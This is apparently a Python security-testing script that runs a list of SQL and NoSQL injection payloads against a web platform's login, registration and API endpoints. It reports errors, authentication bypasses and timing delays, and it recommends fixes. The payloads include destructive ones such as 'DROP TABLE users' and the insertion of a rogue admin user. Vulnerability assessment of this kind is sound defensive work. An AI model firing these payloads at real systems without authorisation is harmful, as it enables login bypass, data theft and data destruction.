#!/usr/bin/env python3
"""
SQL Injection Testing Tool for Monte Carlo Platform
Comprehensive SQL injection vulnerability assessment
"""

import requests
import json
import logging
import time
import random
import string
from datetime import datetime
from typing import Dict, List, Any, Optional
import urllib.parse

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("sql_injection_tester")

class SQLInjectionTester:
    """Comprehensive SQL injection testing"""
    
    def __init__(self, base_url: str = "http://localhost:9090"):
        self.base_url = base_url
        self.api_base = f"{base_url}/api"
        self.test_results = {
            "timestamp": datetime.utcnow().isoformat(),
            "target": base_url,
            "vulnerabilities": [],
            "tested_endpoints": []
        }
        
        # Common SQL injection payloads
        self.sql_payloads = [
            # Basic SQL injection tests
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            
            # Union-based payloads
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            
            # Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "'; pg_sleep(5)--",
            "' OR (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--",
            
            # Boolean-based blind SQL injection
            "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT LENGTH(username) FROM users WHERE id=1) > 5--",
            
            # Error-based SQL injection
            "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) x GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2)))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # PostgreSQL specific
            "'; DROP TABLE users CASCADE--",
            "' OR 1=1; DROP TABLE users--",
            "' UNION SELECT version()--",
            "' UNION SELECT current_user--",
            "' UNION SELECT current_database()--",
            
            # SQLite specific
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            
            # Advanced payloads
            "' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--",
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Second-order SQL injection
            "test'; INSERT INTO users (username, password) VALUES ('injected', 'password');--",
            
            # NoSQL injection payloads (for MongoDB, etc.)
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.username == this.password"},
            {"username": {"$ne": None}, "password": {"$ne": None}}
        ]
    
    def add_vulnerability(self, endpoint: str, payload: str, response_info: dict, vuln_type: str):
        """Add discovered vulnerability"""
        self.test_results["vulnerabilities"].append({
            "endpoint": endpoint,
            "payload": payload,
            "vulnerability_type": vuln_type,
            "response_info": response_info,
            "timestamp": datetime.utcnow().isoformat()
        })
    
    def add_tested_endpoint(self, endpoint: str, method: str, total_payloads: int):
        """Track tested endpoints"""
        self.test_results["tested_endpoints"].append({
            "endpoint": endpoint,
            "method": method,
            "payloads_tested": total_payloads,
            "timestamp": datetime.utcnow().isoformat()
        })
    
    def detect_sql_errors(self, response_text: str) -> bool:
        """Detect SQL error messages in response"""
        sql_error_patterns = [
            # MySQL errors
            "mysql_fetch_array", "mysql_query", "mysql_num_rows", "mysql_error",
            "supplied argument is not a valid mysql", "column count doesn't match",
            "mysql server version", "syntax error near",
            
            # PostgreSQL errors
            "postgresql", "psql", "pg_query", "pg_exec", "pg_connect",
            "invalid input syntax", "relation does not exist", "column does not exist",
            
            # SQLite errors
            "sqlite", "sqlite3", "sqlite_query", "sqlite_exec",
            "no such table", "no such column", "sql logic error",
            
            # SQL Server errors
            "microsoft ole db provider", "odbc sql server driver",
            "microsoft jet database", "syntax error in string in query expression",
            
            # Oracle errors
            "oci_parse", "oci_execute", "ora-00933", "ora-00921", "ora-00936",
            
            # Generic SQL errors
            "sql syntax", "syntax error", "unexpected end of sql command",
            "quoted string not properly terminated", "unterminated quoted string",
            "sql command not properly ended", "sql statement",
            
            # Database connection errors
            "database connection", "connection failed", "could not connect",
            "access denied for user", "unknown database", "table doesn't exist"
        ]
        
        response_lower = response_text.lower()
        return any(pattern in response_lower for pattern in sql_error_patterns)
    
    def test_endpoint_for_sqli(self, endpoint: str, method: str = "POST", 
                              param_name: str = "username", additional_params: dict = None) -> List[dict]:
        """Test a specific endpoint for SQL injection"""
        vulnerabilities = []
        additional_params = additional_params or {}
        
        logger.info(f"Testing {method} {endpoint} parameter '{param_name}' for SQL injection")
        
        for payload in self.sql_payloads:
            try:
                # Prepare request data
                if isinstance(payload, dict):
                    # NoSQL injection payload
                    test_data = payload.copy()
                    test_data.update(additional_params)
                else:
                    # SQL injection payload
                    test_data = {param_name: payload}
                    test_data.update(additional_params)
                
                # Record start time for timing attacks
                start_time = time.time()
                
                # Send request
                if method.upper() == "POST":
                    response = requests.post(f"{self.api_base}{endpoint}", 
                                           json=test_data, timeout=10)
                elif method.upper() == "GET":
                    response = requests.get(f"{self.api_base}{endpoint}", 
                                          params=test_data, timeout=10)
                else:
                    continue
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # Analyze response
                response_info = {
                    "status_code": response.status_code,
                    "response_time": response_time,
                    "content_length": len(response.text),
                    "headers": dict(response.headers),
                    "response_snippet": response.text[:500]
                }
                
                # Check for SQL errors
                if self.detect_sql_errors(response.text):
                    self.add_vulnerability(endpoint, str(payload), response_info, "SQL Error Injection")
                    vulnerabilities.append({
                        "type": "SQL Error Injection",
                        "payload": payload,
                        "response": response_info
                    })
                
                # Check for authentication bypass
                if response.status_code == 200 and any(keyword in response.text.lower() 
                                                     for keyword in ["token", "success", "welcome", "dashboard"]):
                    if "' OR " in str(payload) or payload == {"$ne": None}:
                        self.add_vulnerability(endpoint, str(payload), response_info, "Authentication Bypass")
                        vulnerabilities.append({
                            "type": "Authentication Bypass",
                            "payload": payload,
                            "response": response_info
                        })
                
                # Check for time-based blind SQL injection
                if response_time > 4.5:  # 5 second delay minus some tolerance
                    if any(delay_keyword in str(payload).lower() 
                          for delay_keyword in ["sleep", "waitfor", "delay", "pg_sleep"]):
                        self.add_vulnerability(endpoint, str(payload), response_info, "Time-based Blind SQL Injection")
                        vulnerabilities.append({
                            "type": "Time-based Blind SQL Injection",
                            "payload": payload,
                            "response": response_info
                        })
                
                # Check for information disclosure
                sensitive_info = [
                    "version()", "current_user", "database()", "user()",
                    "@@version", "information_schema", "sqlite_master",
                    "pg_stat_activity", "mysql.user"
                ]
                
                if any(info in response.text.lower() for info in sensitive_info):
                    self.add_vulnerability(endpoint, str(payload), response_info, "Information Disclosure")
                    vulnerabilities.append({
                        "type": "Information Disclosure",
                        "payload": payload,
                        "response": response_info
                    })
                
                # Brief delay to avoid overwhelming the server
                time.sleep(0.1)
                
            except requests.exceptions.Timeout:
                # Potential time-based injection
                if any(delay_keyword in str(payload).lower() 
                      for delay_keyword in ["sleep", "waitfor", "delay", "pg_sleep"]):
                    self.add_vulnerability(endpoint, str(payload), 
                                         {"error": "Request timeout", "timeout": True}, 
                                         "Time-based Blind SQL Injection")
                    vulnerabilities.append({
                        "type": "Time-based Blind SQL Injection (Timeout)",
                        "payload": payload,
                        "response": {"error": "Request timeout"}
                    })
            except Exception as e:
                logger.debug(f"Request failed for payload {payload}: {e}")
        
        return vulnerabilities
    
    def test_authentication_endpoints(self):
        """Test authentication endpoints for SQL injection"""
        logger.info("Testing authentication endpoints...")
        
        # Test login endpoint
        auth_endpoints = [
            ("/auth/login", "POST", {"username": "test", "password": "test"}),
            ("/auth/register", "POST", {"email": "test@test.com", "password": "test"}),
            ("/auth/reset-password", "POST", {"email": "test@test.com"}),
        ]
        
        for endpoint, method, base_params in auth_endpoints:
            # Test username field
            vulns = self.test_endpoint_for_sqli(endpoint, method, "username", base_params)
            if vulns:
                logger.warning(f"Found {len(vulns)} vulnerabilities in {endpoint} username field")
            
            # Test password field
            vulns = self.test_endpoint_for_sqli(endpoint, method, "password", base_params)
            if vulns:
                logger.warning(f"Found {len(vulns)} vulnerabilities in {endpoint} password field")
            
            # Test email field if present
            if "email" in base_params:
                vulns = self.test_endpoint_for_sqli(endpoint, method, "email", base_params)
                if vulns:
                    logger.warning(f"Found {len(vulns)} vulnerabilities in {endpoint} email field")
            
            self.add_tested_endpoint(endpoint, method, len(self.sql_payloads) * 2)
    
    def test_api_endpoints(self):
        """Test API endpoints for SQL injection"""
        logger.info("Testing API endpoints...")
        
        # Common API endpoints to test
        api_endpoints = [
            ("/simulations", "POST", {"name": "test", "description": "test"}),
            ("/excel-parser/upload", "POST", {}),
            ("/simulations/search", "GET", {"query": "test"}),
            ("/users/profile", "GET", {"id": "1"}),
            ("/files/list", "GET", {"filter": "test"}),
        ]
        
        for endpoint, method, base_params in api_endpoints:
            for param in base_params.keys():
                vulns = self.test_endpoint_for_sqli(endpoint, method, param, base_params)
                if vulns:
                    logger.warning(f"Found {len(vulns)} vulnerabilities in {endpoint} {param} field")
            
            self.add_tested_endpoint(endpoint, method, len(self.sql_payloads))
    
    def test_advanced_sql_injection(self):
        """Test advanced SQL injection techniques"""
        logger.info("Testing advanced SQL injection techniques...")
        
        # Test for second-order SQL injection
        # Register a user with SQL injection payload in username
        malicious_usernames = [
            "test'; DROP TABLE users;--",
            "test' UNION SELECT password FROM users WHERE username='admin'--",
            "test'; INSERT INTO users (username, password, is_admin) VALUES ('hacker', 'password', true);--"
        ]
        
        for username in malicious_usernames:
            try:
                # Register user with malicious username
                register_response = requests.post(f"{self.api_base}/auth/register", json={
                    "username": username,
                    "email": f"test_{random.randint(1000, 9999)}@test.com",
                    "password": "Test123!"
                }, timeout=10)
                
                if register_response.status_code == 200:
                    # Try to login - this might trigger second-order injection
                    login_response = requests.post(f"{self.api_base}/auth/login", json={
                        "username": username,
                        "password": "Test123!"
                    }, timeout=10)
                    
                    if self.detect_sql_errors(login_response.text):
                        self.add_vulnerability("/auth/login", username, 
                                             {"second_order": True, "response": login_response.text[:500]},
                                             "Second-order SQL Injection")
                        
            except Exception as e:
                logger.debug(f"Advanced SQL injection test failed: {e}")
    
    def generate_report(self) -> dict:
        """Generate comprehensive SQL injection test report"""
        total_vulnerabilities = len(self.test_results["vulnerabilities"])
        vulnerability_types = {}
        
        for vuln in self.test_results["vulnerabilities"]:
            vuln_type = vuln["vulnerability_type"]
            vulnerability_types[vuln_type] = vulnerability_types.get(vuln_type, 0) + 1
        
        report = {
            "summary": {
                "total_vulnerabilities": total_vulnerabilities,
                "vulnerability_types": vulnerability_types,
                "endpoints_tested": len(self.test_results["tested_endpoints"]),
                "total_payloads_tested": sum(ep["payloads_tested"] for ep in self.test_results["tested_endpoints"])
            },
            "vulnerabilities": self.test_results["vulnerabilities"],
            "tested_endpoints": self.test_results["tested_endpoints"],
            "recommendations": [
                "Use parameterized queries/prepared statements for all database operations",
                "Implement proper input validation and sanitization",
                "Use ORM frameworks that provide built-in SQL injection protection",
                "Apply principle of least privilege for database user accounts",
                "Enable database query logging for monitoring",
                "Implement Web Application Firewall (WAF) to filter malicious requests",
                "Regular security code reviews focusing on database interactions",
                "Use stored procedures where appropriate",
                "Validate and sanitize all user inputs on server side",
                "Implement proper error handling to avoid information disclosure"
            ]
        }
        
        return report
    
    def run_comprehensive_test(self):
        """Run comprehensive SQL injection testing"""
        logger.info("🔍 Starting comprehensive SQL injection testing...")
        
        # Test authentication endpoints
        self.test_authentication_endpoints()
        
        # Test API endpoints
        self.test_api_endpoints()
        
        # Test advanced techniques
        self.test_advanced_sql_injection()
        
        # Generate report
        report = self.generate_report()
        
        return report

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description="SQL Injection Testing Tool")
    parser.add_argument("--url", default="http://localhost:9090", help="Target URL")
    parser.add_argument("--output", default="sql_injection_test_results.json", help="Output file")
    
    args = parser.parse_args()
    
    tester = SQLInjectionTester(args.url)
    results = tester.run_comprehensive_test()
    
    # Save results
    with open(args.output, "w") as f:
        json.dump(results, f, indent=2)
    
    # Print summary
    summary = results["summary"]
    print(f"\n{'='*60}")
    print(f"SQL INJECTION TEST RESULTS")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Endpoints Tested: {summary['endpoints_tested']}")
    print(f"Total Payloads Tested: {summary['total_payloads_tested']}")
    print(f"Vulnerabilities Found: {summary['total_vulnerabilities']}")
    
    if summary['vulnerability_types']:
        print(f"\nVulnerability Types:")
        for vuln_type, count in summary['vulnerability_types'].items():
            print(f"  {vuln_type}: {count}")
    
    print(f"\nDetailed results saved to: {args.output}")
    print(f"{'='*60}")
    
    if summary['total_vulnerabilities'] > 0:
        print("⚠️  SQL INJECTION VULNERABILITIES FOUND - IMMEDIATE ACTION REQUIRED")
        return 1
    else:
        print("✅ No SQL injection vulnerabilities detected")
        return 0

if __name__ == "__main__":
    exit_code = main()
    exit(exit_code)
